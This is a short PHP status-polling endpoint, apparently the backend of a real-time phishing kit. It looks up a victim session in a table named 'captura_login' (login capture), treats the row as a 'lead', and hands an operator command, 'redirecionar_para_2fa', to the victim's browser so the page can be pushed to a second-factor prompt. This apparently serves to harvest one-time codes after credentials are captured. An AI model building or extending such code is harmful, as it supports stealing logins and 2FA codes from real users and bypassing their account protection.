<?php
header('Content-Type: application/json');
require_once __DIR__ . '/db.php'; // Conexão com o banco

$session_id = $_COOKIE['identificador_cliente'] ?? null;
if (!$session_id) {
    echo json_encode(['status' => 'sessao_invalida']);
    exit;
}

try {
    // 1. Busca o status mais recente para esta sessão
    $sql_check = "SELECT id, status FROM captura_login WHERE session_id = ? ORDER BY id DESC LIMIT 1";
    $stmt_check = $pdo->prepare($sql_check);
    $stmt_check->execute([$session_id]);
    $result = $stmt_check->fetch(PDO::FETCH_ASSOC);

    if ($result) {
        $lead_id = $result['id'];
        $current_status = $result['status'];

        // Lista de comandos que precisam ser "consumidos"
        $commands_to_consume = ['redirecionar_para_2fa'];

        // 2. A LÓGICA PRINCIPAL: Verifica se o status é um comando a ser consumido
        if (in_array($current_status, $commands_to_consume)) {
            
            // 3. SE FOR, limpa o comando no banco de dados imediatamente
            $sql_update = "UPDATE captura_login SET status = 'comando_recebido' WHERE id = ?";
            $stmt_update = $pdo->prepare($sql_update);
            $stmt_update->execute([$lead_id]);

            // 4. E SÓ ENTÃO, responde ao cliente com o comando original
            echo json_encode(['status' => $current_status]);

        } else {
            // Se não for um comando, apenas retorna o status atual normalmente
            echo json_encode(['status' => $current_status]);
        }
    } else {
        echo json_encode(['status' => 'nao_encontrado']);
    }

} catch (PDOException $e) {
    error_log('Erro na API de verificação de status: ' . $e->getMessage());
    http_response_code(500);
    echo json_encode(['status' => 'erro_servidor']);
}
?>